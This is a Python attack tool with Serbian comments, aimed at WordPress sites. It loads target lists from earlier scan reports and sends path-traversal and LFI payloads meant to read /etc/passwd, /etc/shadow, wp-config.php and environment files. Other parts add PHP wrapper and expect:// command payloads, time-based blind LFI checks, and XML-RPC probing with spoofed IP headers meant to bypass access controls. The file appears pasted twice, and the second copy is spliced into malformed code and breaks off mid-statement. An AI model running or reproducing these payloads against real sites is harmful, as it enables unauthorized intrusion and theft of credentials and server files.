#!/usr/bin/env python3
"""
WordPress Advanced Exploitation Module
Uƒçitava podatke iz reports/wp/*.json i izvr≈°ava napredne eksploitacije
"""

import json
import requests
import urllib.parse
import base64
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class WordPressAdvancedExploit:
    def __init__(self, reports_dir="reports/wp/"):
        self.reports_dir = reports_dir
        self.session = requests.Session()
        self.session.timeout = 10
        self.results = {}
        self.targets = []
        
        # User-Agent rotation za bypass
        self.user_agents = [
            "Mozilla/5.0 (WordPress/5.8; +http://wordpress.org/)",
            "WordPress/5.9.3; http://example.com/wordpress",
            "Mozilla/5.0 (compatible; WP-CLI/2.6.0)",
            "curl/7.68.0",
            "python-requests/2.28.1"
        ]
        
        # HTTP headers za bypass
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"}
        ]

    def load_wp_reports(self):
        """Uƒçitava sve JSON izve≈°taje iz reports/wp/ foldera"""
        print(f"üîç Uƒçitavam izve≈°taje iz {self.reports_dir}")
        
        if not os.path.exists(self.reports_dir):
            print(f"‚ùå Folder {self.reports_dir} ne postoji!")
            return False
            
        json_files = [f for f in os.listdir(self.reports_dir) if f.endswith('.json')]
        
        if not json_files:
            print(f"‚ùå Nema JSON fajlova u {self.reports_dir}")
            return False
            
        for json_file in json_files:
            try:
                with open(os.path.join(self.reports_dir, json_file), 'r') as f:
                    data = json.load(f)
                    self.parse_wp_data(data, json_file)
                    print(f"‚úÖ Uƒçitao: {json_file}")
            except Exception as e:
                print(f"‚ùå Gre≈°ka pri uƒçitavanju {json_file}: {e}")
                
        return len(self.targets) > 0

    def parse_wp_data(self, data, filename):
        """Parsira WordPress podatke iz JSON-a"""
        try:
            # Izvojna XML-RPC rezultate
            if "attack_results" in data and "xmlrpc_results" in data["attack_results"]:
                for xmlrpc in data["attack_results"]["xmlrpc_results"]:
                    if "url" in xmlrpc:
                        base_url = xmlrpc["url"].replace("/xmlrpc.php", "")
                        self.targets.append({
                            "base_url": base_url,
                            "xmlrpc_url": xmlrpc["url"],
                            "xmlrpc_accessible": xmlrpc.get("accessible", False),
                            "source": filename
                        })
            
            # Izvuci LFI rezultate
            if "attack_results" in data and "lfi_results" in data["attack_results"]:
                for lfi in data["attack_results"]["lfi_results"]:
                    if "base_url" in lfi:
                        base_url = lfi["base_url"]
                        # Dodaj ili a≈æuriraj postojeƒái target
                        existing = next((t for t in self.targets if t["base_url"] == base_url), None)
                        if existing:
                            existing["lfi_tests"] = lfi.get("lfi_tests", [])
                        else:
                            self.targets.append({
                                "base_url": base_url,
                                "lfi_tests": lfi.get("lfi_tests", []),
                                "source": filename
                            })
                            
        except Exception as e:
            print(f"‚ö†Ô∏è  Gre≈°ka pri parsiranju {filename}: {e}")

    def generate_lfi_mutations(self, base_payload="etc/passwd"):
        """Generi≈°e mutacije za LFI bypass"""
        mutations = []
        
        # Osnovni payloads
        basic_payloads = [
            f"../../../{base_payload}",
            f"....//....//....//{base_payload}",
            f"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/../{base_payload}",
            f"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\{base_payload}",
        ]
        
        # URL encoding mutations
        for payload in basic_payloads:
            mutations.extend([
                payload,
                urllib.parse.quote(payload),
                urllib.parse.quote(payload, safe=''),
                payload.replace("../", "%2e%2e%2f"),
                payload.replace("../", "..%252f"),
                payload.replace("../", "..%c0%af"),
                payload.replace("../", "..%c1%9c"),
            ])
        
        # PHP wrapper payloads
        php_wrappers = [
            f"php://filter/convert.base64-encode/resource=../../../{base_payload}",
            f"php://filter/read=string.rot13/resource=../../../{base_payload}",
            f"data://text/plain;base64,{base64.b64encode(f'../../../{base_payload}'.encode()).decode()}",
            f"file:///{base_payload}",
            f"expect://cat ../../../{base_payload}",
        ]
        mutations.extend(php_wrappers)
        
        # Null byte injection (za starije PHP verzije)
        null_bytes = [
            f"../../../{base_payload}%00",
            f"../../../{base_payload}%00.jpg",
            f"../../../{base_payload}\x00",
        ]
        mutations.extend(null_bytes)
        
        return list(set(mutations))  # Ukloni duplikate

    def generate_time_based_lfi_payloads(self, delay_seconds=5):
        """Generi≈°e time-based LFI payloads za blind detection"""
        time_payloads = []
        
        # PHP sleep-based payloads
        php_sleep_payloads = [
            f"data://text/plain,<?php sleep({delay_seconds}); ?>",
            f"data://text/plain;base64,{base64.b64encode(f'<?php sleep({delay_seconds}); ?>'.encode()).decode()}",
            f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php sleep({delay_seconds}); ?>'.encode()).decode()}",
        ]
        time_payloads.extend(php_sleep_payloads)
        
        # Expect command injection
        expect_payloads = [
            f"expect://sleep {delay_seconds}",
            f"expect://timeout {delay_seconds}",
            f"expect://ping -c {delay_seconds} 127.0.0.1",
        ]
        time_payloads.extend(expect_payloads)
        
        # Large file processing delays
        large_file_payloads = [
            "php://filter/convert.iconv.utf-8.utf-16/resource=/dev/zero",
            "php://filter/convert.iconv.utf-8.utf-32/resource=/dev/random",
            f"php://filter/convert.base64-encode|convert.base64-decode/resource=data://text/plain,{'A' * 1000000}",
        ]
        time_payloads.extend(large_file_payloads)
        
        # Multi-layer conversion delays
        complex_filters = [
            "php://filter/convert.iconv.utf-8.utf-16|convert.iconv.utf-16.utf-8|convert.iconv.utf-8.utf-16/resource=/etc/passwd",
            "php://filter/string.rot13|string.rot13|string.rot13|string.rot13/resource=/etc/passwd",
            "php://filter/convert.base64-encode|convert.base64-decode|convert.base64-encode|convert.base64-decode/resource=/etc/passwd",
        ]
        time_payloads.extend(complex_filters)
        
        # Network-based delays (DNS resolution)
        network_delays = [
            f"http://sleep-{delay_seconds}.example.com/nonexistent.txt",
            f"ftp://timeout.invalid.domain.{delay_seconds}/file.txt",
            f"php://filter/convert.base64-encode/resource=http://slow-server-{delay_seconds}.invalid/",
        ]
        time_payloads.extend(network_delays)
        
        return time_payloads

    def measure_baseline_response_time(self, target, endpoint, param="file", samples=3):
        """Meri baseline response time za dati endpoint"""
        baseline_times = []
        
        for _ in range(samples):
            try:
                start_time = time.time()
                test_url = f"{target['base_url']}{endpoint}?{param}=nonexistent_file_{int(time.time())}"
                response = self.session.get(test_url, timeout=15)
                end_time = time.time()
                
                baseline_times.append(end_time - start_time)
                time.sleep(0.5)  # Kratka pauza izmeƒëu testova
                
            except Exception as e:
                continue
                
        if baseline_times:
            avg_baseline = sum(baseline_times) / len(baseline_times)
            max_baseline = max(baseline_times)
            return avg_baseline, max_baseline
        
        return 1.0, 2.0  # Default vrednosti ako merenje ne uspe

    def test_lfi_mutations(self, target):
        """Testira LFI mutacije na target-u"""
        print(f"\nüß™ Testiram LFI mutacije na: {target['base_url']}")
        
        # Generi≈°i payloads za razliƒçite fajlove
        sensitive_files = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/version",
            "proc/self/environ",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "home/www-data/.bash_history",
            # WordPress specifiƒçni fajlovi
            "wp-config.php",
            "wp-content/debug.log",
            ".htaccess"
        ]
        
        vulnerable_endpoints = []
        
        for file_target in sensitive_files:
            mutations = self.generate_lfi_mutations(file_target)
            
            # Testiraj na razliƒçitim endpointovima
            test_endpoints = [
                "/wp-content/themes/twentytwenty/index.php",
                "/wp-content/themes/twentytwenty/functions.php",
                "/wp-includes/template-loader.php",
                "/wp-admin/admin-ajax.php",
                "/index.php",
            ]
            
            for endpoint in test_endpoints:
                for mutation in mutations[:10]:  # Ograniƒçi na 10 najdobrijih mutacija
                    try:
                        for param in ["file", "page", "include", "path", "template", "view"]:
                            test_url = f"{target['base_url']}{endpoint}?{param}={mutation}"
                            
                            # Rotiraj User-Agent i dodaj bypass header-e
                            headers = {"User-Agent": self.user_agents[0]}
                            if self.bypass_headers:
                                headers.update(self.bypass_headers[0])
                            
                            response = self.session.get(test_url, headers=headers, allow_redirects=False)
                            
                            # Analiziraj odgovor
                            if self.analyze_lfi_response(response, file_target):
                                vulnerable_endpoints.append({
                                    "url": test_url,
                                    "payload": mutation,
                                    "parameter": param,
                                    "file_target": file_target,
                                    "status_code": response.status_code,
                                    "response_length": len(response.text),
                                    "evidence": response.text[:200]
                                })
                                print(f"üéØ RANJIVOST PRONAƒêENA: {test_url}")
                                
                            time.sleep(0.1)  # Rate limiting
                            
                    except Exception as e:
                        continue
        
        return vulnerable_endpoints

    def analyze_lfi_response(self, response, target_file):
        """Analizira odgovor za znakove uspe≈°ne LFI eksploitacije"""
        if response.status_code == 200:
            text = response.text.lower()
            
            # Signatori za razliƒçite fajlove
            signatures = {
                "etc/passwd": ["root:", "bin:", "daemon:", "/bin/bash", "/bin/sh"],
                "etc/shadow": ["root:$", "bin:*", "daemon:*"],
                "etc/hosts": ["127.0.0.1", "localhost"],
                "proc/version": ["linux version", "gcc version"],
                "wp-config.php": ["db_name", "db_user", "db_password", "wp_debug"],
                ".htaccess": ["rewriteengine", "rewriterule", "options"]
            }
            
            target_sigs = signatures.get(target_file.split('/')[-1], [])
            
            for sig in target_sigs:
                if sig in text:
                    return True
                    
            # Generiƒçki indikatori
            if any(indicator in text for indicator in [
                "root:x:0:0:",
                "www-data:",
                "mysql:",
                "<?php",
                "define('db_",
                "[main]"
            ]):
                return True
                
        return False

    def test_xmlrpc_bypass(self, target):
        """Testira XML-RPC bypass tehnike"""
        if not target.get("xmlrpc_url"):
            return []
            
        print(f"\nüîß Testiram XML-RPC bypass na: {target['xmlrpc_url']}")
        
        bypassed_methods = []
        
        # XML-RPC metode za testiranje
        test_methods = [
            "system.listMethods",
            "wp.getUsersBlogs", 
            "wp.getUsers",
            "wp.getAuthors",
            "blogger.getUsersBlogs",
            "metaWeblog.getUsersBlogs"
        ]
        
        for method in test_methods:
            for ua in self.user_agents:
                for bypass_header in self.bypass_headers:
                    try:
                        headers = {
                            "User-Agent": ua,
                            "Content-Type": "text/xml",
                            **bypass_header
                        }
                        
                        xml_payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{method}</methodName>
    <params>
    </params>
</methodCall>"""
                        
                        response = self.session.post(
                            target["xmlrpc_url"], 
                            data=xml_payload, 
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200 and "methodResponse" in response.text:
                            bypassed_methods.append({
                                "method": method,
                                "user_agent": ua,
                                "bypass_header": bypass_header,
                                "response": response.text[:500]
                            })
                            print(f"‚úÖ XML-RPC Bypass uspe≈°an: {method}")
                            
                        time.sleep(0.1)
                        
                    except Exception as e:
                        continue
                        
        return bypassed_methods

    def test_theme_specific_exploits(self, target):
        """Testira eksploite specifiƒçne za TwentyTwenty temu"""
        print(f"\nüé® Testiram TwentyTwenty tema eksploite na: {target['base_url']}")
        
        theme_exploits = []
        
        # TwentyTwenty specifiƒçni fajlovi
        theme_files = [
            "/wp-content/themes/twentytwenty/functions.php",
            "/wp-content/themes/twentytwenty/style.css",
            "/wp-content/themes/twentytwenty/index.php",
            "/wp-content/themes/twentytwenty/single.php",
            "/wp-content/themes/twentytwenty/header.php",
            "/wp-content/themes/twentytwenty/footer.php",
            "/wp-content/themes/twentytwenty/screenshot.png",
            "/wp-content/themes/twentytwenty/readme.txt"
        ]
        
        for theme_file in theme_files:
            try:
                url = f"{target['base_url']}{theme_file}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Analiziraj sadr≈æaj za osetljive informacije
                    content = response.text
                    
                    sensitive_patterns = [
                        r"define\s*\(\s*['\"].*?['\"]\s*,\s*['\"].*?['\"]\s*\)",
                        r"\$.*?=\s*['\"].*?['\"]",
                        r"mysql_.*?\(",
                        r"mysqli_.*?\(",
                        r"PDO::",
                        r"password.*?=",
                        r"secret.*?=",
                        r"api.*?key"
                    ]
                    
                    import re
                    findings = []
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            findings.extend(matches[:3])  # Ograniƒçi na 3 match-a
                    
                    if findings or len(content) > 100:
                        theme_exploits.append({
                            "file": theme_file,
                            "url": url,
                            "accessible": True,
                            "size": len(content),
                            "findings": findings,
                            "content_preview": content[:300]
                        })
                        print(f"üìÅ Dostupan fajl: {theme_file}")
                        
            except Exception as e:
                continue
                
        return theme_exploits

    def run_full_exploitation(self):
        """Pokreƒáe kompletnu naprednu eksploitaciju"""
        print("üöÄ WordPress Advanced Exploitation Module")
        print("=" * 50)
        
        if not self.load_wp_reports():
            print("‚ùå Nema podataka za eksploitaciju!")
            return
            
        print(f"üéØ Pronaƒëeno {len(self.targets)} target(a) za eksploitaciju")
        
        all_results = {}
        
        for i, target in enumerate(self.targets, 1):
            print(f"\n{'='*50}")
            print(f"üéØ TARGET {i}/{len(self.targets)}: {target['base_url']}")
            print(f"{'='*50}")
            
            target_results = {
                "target_info": target,
                "lfi_mutations": [],
                "xmlrpc_bypass": [],
                "theme_exploits": [],
                "timestamp": datetime.now().isoformat()
            }
            
            # Test LFI mutations
            try:
                target_results["lfi_mutations"] = self.test_lfi_mutations(target)
            except Exception as e:
                print(f"‚ùå LFI test error: {e}")
                
            # Test XML-RPC bypass
            try:
                target_results["xmlrpc_bypass"] = self.test_xmlrpc_bypass(target)
            except Exception as e:
                print(f"‚ùå XML-RPC test error: {e}")
                
            # Test theme-specific exploits
            try:
                target_results["theme_exploits"] = self.test_theme_specific_exploits(target)
            except Exception as e:
                print(f"‚ùå Theme exploit test error: {e}")
                
            all_results[target["base_url"]] = target_results
            
        # Saƒçuvaj rezultate
        self.save_results(all_results)
        self.print_summary(all_results)

    def save_results(self, results):
        """ƒåuva rezultate u JSON fajl"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/wp/wp_advanced_exploit_{timestamp}.json"
        
        os.makedirs("reports/wp", exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            
        print(f"\nüíæ Rezultati saƒçuvani u: {filename}")

    def print_summary(self, results):
        """Prikazuje sa≈æetak rezultata"""
        print("\n" + "="*60)
        print("üìä SA≈ΩETAK REZULTATA")
        print("="*60)
        
        total_lfi = 0
        total_xmlrpc = 0
        total_theme = 0
        
        for target_url, data in results.items():
            lfi_count = len(data["lfi_mutations"])
            xmlrpc_count = len(data["xmlrpc_bypass"])
            theme_count = len(data["theme_exploits"])
            
            total_lfi += lfi_count
            total_xmlrpc += xmlrpc_count
            total_theme += theme_count
            
            if lfi_count > 0 or xmlrpc_count > 0 or theme_count > 0:
                print(f"\nüéØ {target_url}")
                if lfi_count > 0:
                    print(f"   üß™ LFI ranjivosti: {lfi_count}")
                if xmlrpc_count > 0:
                    print(f"   üîß XML-RPC bypass: {xmlrpc_count}")
                if theme_count > 0:
                    print(f"   üé® Dostupni tema fajlovi: {theme_count}")
        
        print(f"\nüìà UKUPNO:")
        print(f"   üß™ LFI ranjivosti: {total_lfi}")
        print(f"   üîß XML-RPC bypass: {total_xmlrpc}")
        print(f"   üé® Tema eksploiti: {total_theme}")
        
        if total_lfi > 0 or total_xmlrpc > 0 or total_theme > 0:
            print(f"\nüéâ EKSPLOITACIJA USPE≈†NA! Pronaƒëeno ukupno {total_lfi + total_xmlrpc + total_theme} ranjivosti!")
        else:
            print(f"\nüõ°Ô∏è  Svi target-i su dobro za≈°tiƒáeni.")

if __name__ == "__main__":
    # Pokreni eksploitaciju
    exploiter = WordPressAdvancedExploit()
    exploiter.run_full_exploitation()

#!/usr/bin/env python3
"""
WordPress Advanced Exploitation Module
Uƒçitava podatke iz reports/wp/*.json i izvr≈°ava napredne eksploitacije
"""

import json
import requests
import urllib.parse
import base64
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class WordPressAdvancedExploit:
    def __init__(self, reports_dir="reports/wp/"):
        self.reports_dir = reports_dir
        self.session = requests.Session()
        self.session.timeout = 10
        self.results = {}
        self.targets = []
        
        # User-Agent rotation za bypass
        self.user_agents = [
            "Mozilla/5.0 (WordPress/5.8; +http://wordpress.org/)",
            "WordPress/5.9.3; http://example.com/wordpress",
            "Mozilla/5.0 (compatible; WP-CLI/2.6.0)",
            "curl/7.68.0",
            "python-requests/2.28.1"
        ]
        
        # HTTP headers za bypass
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"}
        ]

    def load_wp_reports(self):
        """Uƒçitava sve JSON izve≈°taje iz reports/wp/ foldera"""
        print(f"üîç Uƒçitavam izve≈°taje iz {self.reports_dir}")
        
        if not os.path.exists(self.reports_dir):
            print(f"‚ùå Folder {self.reports_dir} ne postoji!")
            return False
            
        json_files = [f for f in os.listdir(self.reports_dir) if f.endswith('.json')]
        
        if not json_files:
            print(f"‚ùå Nema JSON fajlova u {self.reports_dir}")
            return False
            
        for json_file in json_files:
            try:
                with open(os.path.join(self.reports_dir, json_file), 'r') as f:
                    data = json.load(f)
                    self.parse_wp_data(data, json_file)
                    print(f"‚úÖ Uƒçitao: {json_file}")
            except Exception as e:
                print(f"‚ùå Gre≈°ka pri uƒçitavanju {json_file}: {e}")
                
        return len(self.targets) > 0

    def parse_wp_data(self, data, filename):
        """Parsira WordPress podatke iz JSON-a"""
        try:
            # Izvojna XML-RPC rezultate
            if "attack_results" in data and "xmlrpc_results" in data["attack_results"]:
                for xmlrpc in data["attack_results"]["xmlrpc_results"]:
                    if "url" in xmlrpc:
                        base_url = xmlrpc["url"].replace("/xmlrpc.php", "")
                        self.targets.append({
                            "base_url": base_url,
                            "xmlrpc_url": xmlrpc["url"],
                            "xmlrpc_accessible": xmlrpc.get("accessible", False),
                            "source": filename
                        })
            
            # Izvuci LFI rezultate
            if "attack_results" in data and "lfi_results" in data["attack_results"]:
                for lfi in data["attack_results"]["lfi_results"]:
                    if "base_url" in lfi:
                        base_url = lfi["base_url"]
                        # Dodaj ili a≈æuriraj postojeƒái target
                        existing = next((t for t in self.targets if t["base_url"] == base_url), None)
                        if existing:
                            existing["lfi_tests"] = lfi.get("lfi_tests", [])
                        else:
                            self.targets.append({
                                "base_url": base_url,
                                "lfi_tests": lfi.get("lfi_tests", []),
                                "source": filename
                            })
                            
        except Exception as e:
            print(f"‚ö†Ô∏è  Gre≈°ka pri parsiranju {filename}: {e}")

    def generate_lfi_mutations(self, base_payload="etc/passwd"):
        """Generi≈°e mutacije za LFI bypass"""
        mutations = []
        
        # Osnovni payloads
        basic_payloads = [
            f"../../../{base_payload}",
            f"....//....//....//{base_payload}",
            f"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/../{base_payload}",
            f"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\{base_payload}",
        ]
        
        # URL encoding mutations
        for payload in basic_payloads:
            mutations.extend([
                payload,
                urllib.parse.quote(payload),
                urllib.parse.quote(payload, safe=''),
                payload.replace("../", "%2e%2e%2f"),
                payload.replace("../", "..%252f"),
                payload.replace("../", "..%c0%af"),
                payload.replace("../", "..%c1%9c"),
            ])
        
        # PHP wrapper payloads
        php_wrappers = [
            f"php://filter/convert.base64-encode/resource=../../../{base_payload}",
            f"php://filter/read=string.rot13/resource=../../../{base_payload}",
            f"data://text/plain;base64,{base64.b64encode(f'../../../{base_payload}'.encode()).decode()}",
            f"file:///{base_payload}",
            f"expect://cat ../../../{base_payload}",
        ]
        mutations.extend(php_wrappers)
        
        # Null byte injection (za starije PHP verzije)
        null_bytes = [
            f"../../../{base_payload}%00",
            f"../../../{base_payload}%00.jpg",
            f"../../../{base_payload}\x00",
        ]
        mutations.extend(null_bytes)
        
        return list(set(mutations))  # Ukloni duplikate

    def generate_time_based_lfi_payloads(self, delay_seconds=5):
        """Generi≈°e time-based LFI payloads za blind detection"""
        time_payloads = []
        
        # PHP sleep-based payloads
        php_sleep_payloads = [
            f"data://text/plain,<?php sleep({delay_seconds}); ?>",
            f"data://text/plain;base64,{base64.b64encode(f'<?php sleep({delay_seconds}); ?>'.encode()).decode()}",
            f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php sleep({delay_seconds}); ?>'.encode()).decode()}",
        ]
        time_payloads.extend(php_sleep_payloads)
        
        # Expect command injection
        expect_payloads = [
            f"expect://sleep {delay_seconds}",
            f"expect://timeout {delay_seconds}",
            f"expect://ping -c {delay_seconds} 127.0.0.1",
        ]
        time_payloads.extend(expect_payloads)
        
        # Large file processing delays
        large_file_payloads = [
            "php://filter/convert.iconv.utf-8.utf-16/resource=/dev/zero",
            "php://filter/convert.iconv.utf-8.utf-32/resource=/dev/random",
            f"php://filter/convert.base64-encode|convert.base64-decode/resource=data://text/plain,{'A' * 1000000}",
        ]
        time_payloads.extend(large_file_payloads)
        
        # Multi-layer conversion delays
        complex_filters = [
            "php://filter/convert.iconv.utf-8.utf-16|convert.iconv.utf-16.utf-8|convert.iconv.utf-8.utf-16/resource=/etc/passwd",
            "php://filter/string.rot13|string.rot13|string.rot13|string.rot13/resource=/etc/passwd",
            "php://filter/convert.base64-encode|convert.base64-decode|convert.base64-encode|convert.base64-decode/resource=/etc/passwd",
        ]
        time_payloads.extend(complex_filters)
        
        # Network-based delays (DNS resolution)
        network_delays = [
            f"http://sleep-{delay_seconds}.example.com/nonexistent.txt",
            f"ftp://timeout.invalid.domain.{delay_seconds}/file.txt",
            f"php://filter/convert.base64-encode/resource=http://slow-server-{delay_seconds}.invalid/",
        ]
        time_payloads.extend(network_delays)
        
        return time_payloads

    def measure_baseline_response_time(self, target, endpoint, param="file", samples=3):
        """Meri baseline response time za dati endpoint"""
        baseline_times = []
        
        for _ in range(samples):
            try:
                start_time = time.time()
                test_url = f"{target['base_url']}{endpoint}?{param}=nonexistent_file_{int(time.time())}"
                response = self.session.get(test_url, timeout=15)
                end_time = time.time()
                
                baseline_times.append(end_time - start_time)
                time.sleep(0.5)  # Kratka pauza izmeƒëu testova
                
            except Exception as e:
                continue
                
        if baseline_times:
            avg_baseline = sum(baseline_times) / len(baseline_times)
            max_baseline = max(baseline_times)
            return avg_baseline, max_baseline
        
        return 1.0, 2.0  # Default vrednosti ako merenje ne uspe

    def test_time_based_lfi(self, target, delay_seconds=5):
        """Testira time-based blind LFI eksploitaciju"""
        print(f"\n‚è±Ô∏è Testiram TIME-BASED LFI na: {target['base_url']}")
        
        time_based_vulnerabilities = []
        
        # Test endpointi
        test_endpoints = [
            "/wp-content/themes/twentytwenty/index.php",
            "/wp-content/themes/twentytwenty/functions.php", 
            "/wp-includes/template-loader.php",
            "/wp-admin/admin-ajax.php",
            "/index.php",
        ]
        
        # Parametri za testiranje
        test_params = ["file", "page", "include", "path", "template", "view", "load", "src"]
        
        for endpoint in test_endpoints:
            print(f"  üìä Merim baseline za: {endpoint}")
            
            for param in test_params:
                # Izmeri baseline response time
                baseline_avg, baseline_max = self.measure_baseline_response_time(target, endpoint, param)
                threshold = max(baseline_avg + 2.0, baseline_max + 1.0, delay_seconds - 1.0)
                
                print(f"    ‚è∞ Baseline: {baseline_avg:.2f}s (max: {baseline_max:.2f}s), threshold: {threshold:.2f}s")
                
                # Testiraj time-based payloads
                time_payloads = self.generate_time_based_lfi_payloads(delay_seconds)
                
                for payload in time_payloads:
                    try:
                        test_url = f"{target['base_url']}{endpoint}?{param}={urllib.parse.quote(payload)}"
                        
                        # Rotiraj User-Agent
                        headers = {"User-Agent": self.user_agents[len(time_based_vulnerabilities) % len(self.user_agents)]}
                        
                        print(f"    üß™ Testiram: {payload[:50]}...")
                        
                        start_time = time.time()
                        try:
                            response = self.session.get(test_url, headers=headers, timeout=delay_seconds + 10)
                            end_time = time.time()
                            response_time = end_time - start_time
                            
                            # Analiziraj da li je response time znaƒçajno dulji
                            if response_time >= threshold:
                                # Potvrdi sa ponovnim testom
                                print(f"      ‚ö†Ô∏è Potencijalna ranjivost! Response time: {response_time:.2f}s")
                                
                                # Confirmation test
                                start_time2 = time.time()
                                response2 = self.session.get(test_url, headers=headers, timeout=delay_seconds + 10)
                                end_time2 = time.time()
                                response_time2 = end_time2 - start_time2
                                
                                if response_time2 >= threshold:
                                    time_based_vulnerabilities.append({
                                        "url": test_url,
                                        "endpoint": endpoint,
                                        "parameter": param,
                                        "payload": payload,
                                        "payload_type": self.classify_time_payload(payload),
                                        "baseline_time": baseline_avg,
                                        "response_time_1": response_time,
                                        "response_time_2": response_time2,
                                        "delay_difference": response_time - baseline_avg,
                                        "status_code": response.status_code,
                                        "content_length": len(response.text),
                                        "confirmed": True
                                    })
                                    
                                    print(f"      üéØ TIME-BASED LFI POTVRƒêEN!")
                                    print(f"         Response times: {response_time:.2f}s, {response_time2:.2f}s")
                                    print(f"         Difference: +{response_time - baseline_avg:.2f}s")
                                    
                        except requests.exceptions.Timeout:
                            # Timeout mo≈æe biti indikator uspe≈°ne eksploitacije
                            timeout_vulnerability = {
                                "url": test_url,
                                "endpoint": endpoint,
                                "parameter": param,  
                                "payload": payload,
                                "payload_type": self.classify_time_payload(payload),
                                "baseline_time": baseline_avg,
                                "response_time_1": "TIMEOUT",
                                "response_time_2": "N/A",
                                "delay_difference": f">{delay_seconds + 10}s",
                                "status_code": "TIMEOUT",
                                "content_length": 0,
                                "confirmed": False,
                                "timeout_based": True
                            }
                            
                            time_based_vulnerabilities.append(timeout_vulnerability)
                            print(f"      ‚è∞ TIMEOUT DETEKTOVAN - Mo≈æda je uspe≈°an payload!")
                            
                        time.sleep(0.2)  # Rate limiting
                        
                    except Exception as e:
                        continue
                        
        return time_based_vulnerabilities

    def classify_time_payload(self, payload):
        """Klasifikuje tip time-based payload-a"""
        if "sleep" in payload.lower():
            return "PHP_SLEEP"
        elif "expect://" in payload:
            return "EXPECT_COMMAND"
        elif "convert.iconv" in payload:
            return "ICONV_PROCESSING"
        elif "base64-encode|convert.base64-decode" in payload:
            return "MULTI_LAYER_ENCODING"
        elif "/dev/zero" in payload or "/dev/random" in payload:
            return "LARGE_FILE_PROCESSING"
        elif "http://" in payload or "ftp://" in payload:
            return "NETWORK_DELAY"
        elif len(payload) > 500:
            return "LARGE_PAYLOAD"
        else:
            return "UNKNOWN"
        """Testira LFI mutacije na target-u"""
        print(f"\nüß™ Testiram LFI mutacije na: {target['base_url']}")
        
        # Generi≈°i payloads za razliƒçite fajlove
        sensitive_files = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/version",
            "proc/self/environ",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "home/www-data/.bash_history",
            # WordPress specifiƒçni fajlovi
            "wp-config.php",
            "wp-content/debug.log",
            ".htaccess"
        ]
        
        vulnerable_endpoints = []
        
        for file_target in sensitive_files:
            mutations = self.generate_lfi_mutations(file_target)
            
            # Testiraj na razliƒçitim endpointovima
            test_endpoints = [
                "/wp-content/themes/twentytwenty/index.php",
                "/wp-content/themes/twentytwenty/functions.php",
                "/wp-includes/template-loader.php",
                "/wp-admin/admin-ajax.php",
                "/index.php",
            ]
            
            for endpoint in test_endpoints:
                for mutation in mutations[:10]:  # Ograniƒçi na 10 najdobrijih mutacija
                    try:
                        for param in ["file", "page", "include", "path", "template", "view"]:
                            test_url = f"{target['base_url']}{endpoint}?{param}={mutation}"
                            
                            # Rotiraj User-Agent i dodaj bypass header-e
                            headers = {"User-Agent": self.user_agents[0]}
                            if self.bypass_headers:
                                headers.update(self.bypass_headers[0])
                            
                            response = self.session.get(test_url, headers=headers, allow_redirects=False)
                            
                            # Analiziraj odgovor
                            if self.analyze_lfi_response(response, file_target):
                                vulnerable_endpoints.append({
                                    "url": test_url,
                                    "payload": mutation,
                                    "parameter": param,
                                    "file_target": file_target,
                                    "status_code": response.status_code,
                                    "response_length": len(response.text),
                                    "evidence": response.text[:200]
                                })
                                print(f"üéØ RANJIVOST PRONAƒêENA: {test_url}")
                                
                            time.sleep(0.1)  # Rate limiting
                            
                    except Exception as e:
                        continue
        
        return vulnerable_endpoints

    def analyze_lfi_response(self, response, target_file):
        """Analizira odgovor za znakove uspe≈°ne LFI eksploitacije"""
        if response.status_code == 200:
            text = response.text.lower()
            
            # Signatori za razliƒçite fajlove
            signatures = {
                "etc/passwd": ["root:", "bin:", "daemon:", "/bin/bash", "/bin/sh"],
                "etc/shadow": ["root:$", "bin:*", "daemon:*"],
                "etc/hosts": ["127.0.0.1", "localhost"],
                "proc/version": ["linux version", "gcc version"],
                "wp-config.php": ["db_name", "db_user", "db_password", "wp_debug"],
                ".htaccess": ["rewriteengine", "rewriterule", "options"]
            }
            
            target_sigs = signatures.get(target_file.split('/')[-1], [])
            
            for sig in target_sigs:
                if sig in text:
                    return True
                    
            # Generiƒçki indikatori
            if any(indicator in text for indicator in [
                "root:x:0:0:",
                "www-data:",
                "mysql:",
                "<?php",
                "define('db_",
                "[main]"
            ]):
                return True
                
        return False

    def test_xmlrpc_bypass(self, target):
        """Testira XML-RPC bypass tehnike"""
        if not target.get("xmlrpc_url"):
            return []
            
        print(f"\nüîß Testiram XML-RPC bypass na: {target['xmlrpc_url']}")
        
        bypassed_methods = []
        
        # XML-RPC metode za testiranje
        test_methods = [
            "system.listMethods",
            "wp.getUsersBlogs", 
            "wp.getUsers",
            "wp.getAuthors",
            "blogger.getUsersBlogs",
            "metaWeblog.getUsersBlogs"
        ]
        
        for method in test_methods:
            for ua in self.user_agents:
                for bypass_header in self.bypass_headers:
                    try:
                        headers = {
